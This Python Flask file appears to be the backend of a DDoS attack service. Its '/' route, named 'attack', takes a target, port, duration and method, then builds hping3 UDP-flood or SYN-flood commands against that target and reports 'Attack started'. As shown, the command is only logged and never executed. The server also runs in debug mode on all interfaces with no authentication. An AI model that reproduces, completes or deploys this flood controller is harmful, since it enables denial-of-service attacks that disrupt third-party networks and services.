from flask import Flask, request, jsonify
import subprocess
import logging
import socket

# 配置日志
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/', methods=['GET'])
def attack():
    target = request.args.get('target')
    port = request.args.get('port')
    time = request.args.get('time')
    method = request.args.get('method')

    logger.info(f"Received attack request - Target: {target}, Port: {port}, Time: {time}, Method: {method}")

    if not all([target, port, time, method]):
        logger.error("Missing parameters")
        return jsonify({"status": "error", "msg": "Missing parameters"}), 400

    try:
        time = int(time)
        port = int(port)
    except ValueError:
        logger.error(f"Invalid time or port value - Time: {time}, Port: {port}")
        return jsonify({"status": "error", "msg": "Invalid time or port value"}), 400

    if time <= 0 or port <= 0:
        logger.error(f"Invalid time or port - Time: {time}, Port: {port}")
        return jsonify({"status": "error", "msg": "Time and port must be positive numbers"}), 400

    if method.lower() == "udp":
        cmd = [
            "hping3",
            "--udp",
            "-p", str(port),
            target,
            "-i", "u1000",
            "-c", str(time * 1000)
        ]
    elif method.lower() == "syn":
        cmd = [
            "hping3",
            "-S",
            "--flood",
            "-p", str(port),
            target
        ]
    else:
        logger.error(f"Unsupported method: {method}")
        return jsonify({"status": "error", "msg": "Unsupported method"}), 400

    logger.info(f"Executing command: {' '.join(cmd)}")
    return jsonify({"status": "success", "msg": "Attack started"})

if __name__ == '__main__':
    # 获取本机IP
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"Server starting on {local_ip}:8080")
    
    # 启动服务器
    app.run(host='0.0.0.0', port=8080, debug=True)
